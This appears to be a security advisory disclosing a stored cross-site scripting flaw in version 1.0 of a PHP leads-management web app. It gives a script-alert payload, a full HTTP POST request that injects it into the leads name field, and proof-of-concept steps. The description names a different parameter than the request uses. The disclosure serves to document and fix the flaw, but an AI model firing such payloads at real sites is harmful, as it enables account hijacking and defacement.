# Leads Manager Tool - Stored Cross-Site Scripting(XSS)

#### Exploit Title: Leads Manager Tool - Stored Cross-Site Scripting

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/17510/leads-manager-tool-using-php-and-mysql-source-code.html

#### Software Link:https://www.sourcecodester.com/download-code?nid=17510&title=Leads+Manager+Tool+Using+PHP+and+MySQL+with+Source+Code

#### Version: Leads Manager Tool 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.Online Leads Manager Tool does not filter the content correctly at the "notice" parameter, resulting in the generation of stored XSS.

#### Payload used:

`<script>alert("a")</script>`

```
POST /endpoint/add-leads.php HTTP/1.1
Host: 192.168.67.35:8093
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

leads_name=%3Cscript%3Ealert%28%27a%27%29%3C%2Fscript%3E&email_add=111%40qq.com&phone_number=1232131
```

#### Proof of Concept

1、Visit the website, click on "add leads", and fill in the xss payload in the "Leads Name" field

![image](https://github.com/joinia/webray.com.cn/blob/main/Leads-Manager-Tool/images/xss.png)

2、After successfully adding, re visiting the page will trigger an XSS pop-up window

![image](https://github.com/joinia/webray.com.cn/blob/main/Leads-Manager-Tool/images/xss2.png)

3、The captured post packet is as follows：

![image](https://github.com/joinia/webray.com.cn/blob/main/Leads-Manager-Tool/images/xss1.png)
